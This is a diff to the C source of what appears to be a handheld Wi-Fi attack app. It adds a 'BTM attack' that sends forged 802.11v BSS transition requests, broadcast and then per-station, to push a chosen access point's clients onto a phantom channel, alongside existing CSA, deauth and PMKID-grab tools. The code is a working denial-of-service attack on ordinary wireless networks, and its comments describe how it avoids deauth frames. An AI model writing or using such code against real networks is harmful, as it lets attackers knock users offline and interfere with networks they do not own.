@@ -347,6 +347,7 @@ typedef enum {
 #define TOOL_IDS     15
 #define TOOL_CSA     16
 #define TOOL_TRACK   17
+#define TOOL_BTM     18
 #define TOOL_PICKAP  20
 
 // Deferred GUI events posted from the UART worker thread (GUI must run on the GUI thread).
@@ -1387,6 +1388,31 @@ static void delfy_csa(delfyRTL* app) {
     { char b[48]; snprintf(b, sizeof(b), "ch %d -> %d", ch, newch); delfy_busy(app, "CSA", b); }
 }
 
+// B3: 802.11v BSS transition management. Asks the selected AP's clients to move to a phantom
+// candidate on another channel - the standard steering an AP does for load balancing. Same two
+// passes as the CSA attack (broadcast, then per-station unicast, which is what clients obey) and
+// no deauth frame anywhere. Same limit too: PMF/WPA3 clients ignore unprotected management
+// action frames.
+static void delfy_btm(delfyRTL* app) {
+    int ch;
+    char hex[13];
+    delfy_sel_ap(app, &ch, hex);
+    if(hex[0] == '\0') {
+        snprintf(popupHeader, sizeof(popupHeader), "BTM");
+        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
+        scene_manager_next_scene(app->scene_manager, popupScene);
+        return;
+    }
+    int newch = (ch <= 6) ? 11 : 1;   // steer them as far across the band as it allows
+    char cmd[64];
+    snprintf(cmd, sizeof(cmd), "BTM %s %d %d 12\n", hex, ch, newch);
+    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
+    furi_delay_ms(120);
+    snprintf(cmd, sizeof(cmd), "BTMSTAS %s %d %d\n", hex, ch, newch);
+    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
+    { char b[48]; snprintf(b, sizeof(b), "ch %d -> %d", ch, newch); delfy_busy(app, "BTM", b); }
+}
+
 static void delfy_deauth_add(delfyRTL* app) {
     int ch;
     char hex[13];
@@ -1983,6 +2009,7 @@ static void tools_item_callback(void* context, uint32_t index) {
     case TOOL_IDS: delfy_start_ids(app); break;
     case TOOL_CSA: delfy_csa(app); break;
     case TOOL_TRACK: delfy_track(app); break;
+    case TOOL_BTM: delfy_btm(app); break;
     case TOOL_PICKAP: scene_manager_next_scene(app->scene_manager, pickApScene); break;
     case TOOL_PMKID: delfy_start_pmkid(app, false); break;
     case TOOL_PKGRAB: delfy_start_pmkid(app, true); break;
@@ -2046,6 +2073,9 @@ void tools_menu_scene_on_enter(void* context) {
         submenu_add_item(app->submenu, "Deauth IDS", TOOL_IDS, tools_item_callback, app);
         submenu_add_item(app->submenu, "CSA attack (this AP)", TOOL_CSA, tools_item_callback, app);
         submenu_add_item(app->submenu, "Client tracker", TOOL_TRACK, tools_item_callback, app);
+    }
+    if(delfy_has_cap(app, 'T')) {
+        submenu_add_item(app->submenu, "BTM attack (this AP)", TOOL_BTM, tools_item_callback, app);
     }
     submenu_add_item(app->submenu, "Channel hop on/off", TOOL_HOP, tools_item_callback, app);
     submenu_add_item(app->submenu, "Stop / clear", TOOL_STOP, tools_item_callback, app);
@@ -4337,6 +4367,14 @@ void uart_process_line(FuriString* line, void* context) {
             hs_lens[hs_count] = n;
             hs_count++;
         }
+    } else if(
+        strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0 ||
+        strncmp(furi_string_get_cstr(line), "BTMSTAS:", 8) == 0) {
+        // The board confirms a management-action burst. Only the unicast (second) pass is
+        // watched: BTM/CSA always print their own line first, and two popups would stack.
+        snprintf(message, sizeof(message), "%s", furi_string_get_cstr(line));
+        snprintf(popupHeader, sizeof(popupHeader), "Sent");
+        view_dispatcher_send_custom_event(app->view_dispatcher, DELFY_EVT_POPUP);
     } else if(strncmp(furi_string_get_cstr(line), "HSDONE:", 7) == 0) {
         uint16_t written = 0;
         if(batch_active) {
